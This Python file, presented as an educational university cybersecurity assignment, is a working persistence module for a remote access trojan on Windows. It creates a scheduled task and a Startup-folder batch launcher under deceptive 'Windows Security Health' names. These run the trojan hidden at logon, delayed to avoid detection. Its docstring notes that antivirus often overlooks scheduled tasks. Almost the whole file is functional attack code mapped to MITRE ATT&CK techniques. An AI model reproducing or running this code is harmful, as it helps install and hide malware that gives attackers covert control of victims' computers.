"""
Scheduled Task Persistence Module
MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Creates a Windows Scheduled Task for persistence as an alternative to
Registry Run keys (persistence.py). This provides redundant persistence.

Why Scheduled Tasks vs Registry Run:
  - Registry Run: executes at logon only
  - Scheduled Task: can trigger at logon, on boot, on idle, at intervals
  - Some AV products only check registry; scheduled tasks are often overlooked
  - Real APTs (APT29/Cozy Bear) use scheduled tasks extensively
  - Can run as SYSTEM if admin privileges available

Implementation:
  - Uses schtasks.exe (built-in Windows utility)
  - No admin required for HKCU-level tasks
  - Task runs at user logon with 1-minute delay (stealth)
"""

import os
import sys
import subprocess


# Task configuration
TASK_NAME = "WindowsSecurityHealthCheck"
TASK_DESCRIPTION = "Windows Security Health Monitoring Service"


def install_scheduled_task():
    """
    Create a Windows Scheduled Task to run the RAT at user logon.

    Uses schtasks.exe to create a task that:
    - Triggers at user logon
    - Has a 60-second delay (avoids detection during boot)
    - Runs with current user privileges (no admin needed)
    - Uses pythonw.exe for hidden execution

    Returns:
        dict with installation status and details
    """
    try:
        # Find pythonw.exe for hidden execution
        python_dir = os.path.dirname(sys.executable)
        pythonw = os.path.join(python_dir, "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable

        # Path to RAT client
        rat_path = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "WindowsSecurityHealth", "rat_client.py"
        )

        # Fallback to current directory if AppData copy doesn't exist
        if not os.path.exists(rat_path):
            rat_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "rat_client.py"
            )

        action = f'"{pythonw}" "{rat_path}"'

        # Create scheduled task using schtasks.exe
        # /SC ONLOGON = trigger at user logon
        # /DELAY 0001:00 = 1 minute delay after logon
        # /F = force create (overwrite if exists)
        cmd = (
            f'schtasks /Create /TN "{TASK_NAME}" '
            f'/TR "{action}" '
            f'/SC ONLOGON '
            f'/DELAY 0001:00 '
            f'/F '
            f'/RL LIMITED'
        )

        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=15
        )

        if result.returncode == 0:
            return {
                "installed": True,
                "task_name": TASK_NAME,
                "action": action,
                "trigger": "ONLOGON (60s delay)",
                "privilege": "LIMITED (current user)",
                "message": "Scheduled task persistence installed",
            }
        else:
            return {
                "installed": False,
                "error": result.stderr.strip(),
                "message": "Failed to create scheduled task",
            }

    except Exception as e:
        return {
            "installed": False,
            "error": str(e),
            "message": "Exception during scheduled task creation",
        }


def remove_scheduled_task():
    """
    Remove the persistence scheduled task.

    Returns:
        dict with removal status
    """
    try:
        cmd = f'schtasks /Delete /TN "{TASK_NAME}" /F'
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=15
        )

        if result.returncode == 0:
            return {"removed": True, "task_name": TASK_NAME}
        elif "cannot find" in result.stderr.lower() or "does not exist" in result.stderr.lower():
            return {"removed": True, "task_name": TASK_NAME, "note": "Task not found (already clean)"}
        else:
            return {"removed": False, "error": result.stderr.strip()}

    except Exception as e:
        return {"removed": False, "error": str(e)}


def check_scheduled_task():
    """
    Check if the persistence scheduled task exists.

    Returns:
        dict with task status and details
    """
    try:
        cmd = f'schtasks /Query /TN "{TASK_NAME}" /V /FO LIST'
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=15
        )

        if result.returncode == 0:
            # Parse output for key fields
            info = {"exists": True, "task_name": TASK_NAME}
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Status:"):
                    info["status"] = line.split(":", 1)[1].strip()
                elif line.startswith("Task To Run:"):
                    info["action"] = line.split(":", 1)[1].strip()
                elif line.startswith("Run As User:"):
                    info["run_as"] = line.split(":", 1)[1].strip()
                elif line.startswith("Schedule Type:"):
                    info["trigger"] = line.split(":", 1)[1].strip()
                elif line.startswith("Next Run Time:"):
                    info["next_run"] = line.split(":", 1)[1].strip()
                elif line.startswith("Last Run Time:"):
                    info["last_run"] = line.split(":", 1)[1].strip()

            return info
        else:
            return {"exists": False, "task_name": TASK_NAME}

    except Exception as e:
        return {"exists": False, "error": str(e)}


def install_startup_folder_persistence():
    """
    Alternative persistence via Startup folder shortcut.
    MITRE ATT&CK: T1547.001 (sub-variant: Startup Folder)

    Creates a .bat file in the user's Startup folder that launches the RAT.
    This provides a third persistence mechanism.

    Returns:
        dict with installation status
    """
    try:
        startup_folder = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )

        if not os.path.exists(startup_folder):
            return {"installed": False, "error": "Startup folder not found"}

        # Find pythonw.exe
        python_dir = os.path.dirname(sys.executable)
        pythonw = os.path.join(python_dir, "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable

        # Path to RAT
        rat_path = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "WindowsSecurityHealth", "rat_client.py"
        )
        if not os.path.exists(rat_path):
            rat_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "rat_client.py"
            )

        # Create a .bat launcher with innocent name
        bat_name = "WindowsSecurityHealth.bat"
        bat_path = os.path.join(startup_folder, bat_name)

        bat_content = f'@echo off\nstart "" "{pythonw}" "{rat_path}"\n'

        with open(bat_path, "w") as f:
            f.write(bat_content)

        return {
            "installed": True,
            "path": bat_path,
            "method": "startup_folder_bat",
            "message": "Startup folder persistence installed",
        }

    except Exception as e:
        return {"installed": False, "error": str(e)}


def remove_startup_folder_persistence():
    """Remove the Startup folder .bat file."""
    try:
        startup_folder = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        bat_path = os.path.join(startup_folder, "WindowsSecurityHealth.bat")

        if os.path.exists(bat_path):
            os.remove(bat_path)
            return {"removed": True, "path": bat_path}
        else:
            return {"removed": True, "note": "File not found (already clean)"}

    except Exception as e:
        return {"removed": False, "error": str(e)}


if __name__ == "__main__":
    print("=" * 50)
    print("  Scheduled Task Persistence Module Test")
    print("  MITRE ATT&CK: T1053.005")
    print("=" * 50)

    # Check current state
    status = check_scheduled_task()
    print(f"\n[*] Scheduled task '{TASK_NAME}': {'EXISTS' if status.get('exists') else 'Not found'}")

    if not status.get("exists"):
        print("\n[*] Installing scheduled task persistence...")
        result = install_scheduled_task()
        print(f"    Result: {result['message']}")
        if result["installed"]:
            print(f"    Task: {result['task_name']}")
            print(f"    Trigger: {result['trigger']}")

        print("\n[*] Installing startup folder persistence...")
        result2 = install_startup_folder_persistence()
        print(f"    Result: {result2.get('message', result2)}")
    else:
        print(f"    Status: {status.get('status')}")
        print(f"    Action: {status.get('action')}")
        print("\n[*] Removing scheduled task...")
        remove_scheduled_task()
        print("[*] Removing startup folder persistence...")
        remove_startup_folder_persistence()
